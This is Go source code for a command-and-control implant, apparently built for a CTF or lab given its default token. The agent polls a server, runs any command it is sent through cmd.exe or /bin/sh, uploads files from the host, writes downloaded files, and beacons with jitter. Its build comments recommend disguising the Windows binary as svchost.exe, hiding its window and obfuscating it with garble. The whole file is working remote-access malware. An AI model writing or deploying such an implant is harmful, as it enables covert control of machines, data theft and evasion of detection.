package main

// C2 agent — Go rewrite of c2_agent.py
//
// Build (Linux):
//   go build -ldflags "-s -w" -trimpath -o agent .
//
// Build (Windows exe, cross-compile from Linux):
//   GOOS=windows GOARCH=amd64 go build -ldflags "-s -w -H windowsgui" -trimpath -o svchost.exe .
//
// Build with garble (obfuscated, recommended):
//   garble -tiny build -o svchost.exe .
//
// Configure via env vars at runtime, or edit the const block below before compiling.
// Env vars take priority over compiled-in defaults.
//
// C2_SERVER  — server URL            (default: http://127.0.0.1:8080)
// C2_TOKEN   — shared secret token   (default: ctf-token-changeme)
// C2_INTERVAL — beacon interval secs (default: 5)

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
)

// ── Compiled-in defaults (override with env vars) ──────────────────────────────
const (
	defaultServer   = "http://127.0.0.1:8080"
	defaultToken    = "ctf-token-changeme"
	defaultInterval = 5   // seconds
	defaultJitter   = 0.3 // ±30% random jitter on each sleep
	httpTimeout     = 15  // seconds
)

// ── Runtime config ─────────────────────────────────────────────────────────────
var (
	server   string
	token    string
	interval time.Duration
)

func init() {
	server = env("C2_SERVER", defaultServer)
	token  = env("C2_TOKEN", defaultToken)

	secs, err := strconv.Atoi(env("C2_INTERVAL", strconv.Itoa(defaultInterval)))
	if err != nil || secs < 1 {
		secs = defaultInterval
	}
	interval = time.Duration(secs) * time.Second
}

func env(key, def string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return def
}

// ── HTTP helpers ───────────────────────────────────────────────────────────────
func client() *http.Client {
	return &http.Client{Timeout: time.Duration(httpTimeout) * time.Second}
}

func baseHeaders(req *http.Request) {
	req.Header.Set("X-Token", token)
	if h, err := os.Hostname(); err == nil {
		req.Header.Set("X-Host", h)
	}
}

func get(path string) ([]byte, error) {
	req, err := http.NewRequest("GET", server+path, nil)
	if err != nil {
		return nil, err
	}
	baseHeaders(req)
	resp, err := client().Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}

func post(path string, body []byte, extra map[string]string) error {
	req, err := http.NewRequest("POST", server+path, bytes.NewReader(body))
	if err != nil {
		return err
	}
	baseHeaders(req)
	for k, v := range extra {
		req.Header.Set(k, v)
	}
	resp, err := client().Do(req)
	if err != nil {
		return err
	}
	resp.Body.Close()
	return nil
}

func postResult(cmd, output string) {
	data, _ := json.Marshal(map[string]string{"cmd": cmd, "output": output})
	post("/result", data, map[string]string{"Content-Type": "application/json"}) //nolint
}

// ── Command execution ──────────────────────────────────────────────────────────
func shell(cmd string) string {
	var c *exec.Cmd
	if runtime.GOOS == "windows" {
		c = exec.Command("cmd.exe", "/C", cmd)
	} else {
		c = exec.Command("/bin/sh", "-c", cmd)
	}
	out, _ := c.CombinedOutput()
	result := strings.TrimSpace(string(out))
	if result == "" {
		return "(command completed, no output)"
	}
	return result
}

// ── File transfer ──────────────────────────────────────────────────────────────
func handleGet(remotePath string) {
	remotePath = strings.TrimSpace(remotePath)
	data, err := os.ReadFile(remotePath)
	if err != nil {
		postResult("#get "+remotePath, fmt.Sprintf("[!] Read failed: %v", err))
		return
	}
	post("/upload", data, map[string]string{
		"X-Filename":   filepath.Base(remotePath),
		"Content-Type": "application/octet-stream",
	}) //nolint
}

func handlePut(filename string) {
	filename = strings.TrimSpace(filename)
	data, err := get("/file/" + filename)
	if err != nil || len(data) == 0 {
		postResult("#put "+filename, fmt.Sprintf("[!] Download failed: %v", err))
		return
	}
	dest := filepath.Base(filename)
	if err := os.WriteFile(dest, data, 0644); err != nil {
		postResult("#put "+filename, fmt.Sprintf("[!] Write failed: %v", err))
		return
	}
	postResult("#put "+filename, fmt.Sprintf("[+] Saved to %s (%d bytes)", dest, len(data)))
}

// ── Beacon loop ────────────────────────────────────────────────────────────────
func beacon() {
	body, err := get("/beacon")
	if err != nil || len(body) == 0 {
		return
	}

	var resp map[string]string
	if err := json.Unmarshal(body, &resp); err != nil {
		return
	}

	cmd := strings.TrimSpace(resp["cmd"])
	if cmd == "" {
		return
	}

	switch {
	case strings.HasPrefix(cmd, "#get "):
		go handleGet(strings.TrimPrefix(cmd, "#get "))
	case strings.HasPrefix(cmd, "#put "):
		go handlePut(strings.TrimPrefix(cmd, "#put "))
	default:
		go func(c string) {
			postResult(c, shell(c))
		}(cmd)
	}
}

// ── Jittered sleep ─────────────────────────────────────────────────────────────
func sleep() {
	jitter := 1.0 - defaultJitter + rand.Float64()*(defaultJitter*2)
	time.Sleep(time.Duration(float64(interval) * jitter))
}

// ── Entry point ────────────────────────────────────────────────────────────────
func main() {
	rand.Seed(time.Now().UnixNano())
	for {
		func() {
			defer func() { recover() }() // silently swallow all panics
			beacon()
		}()
		sleep()
	}
}
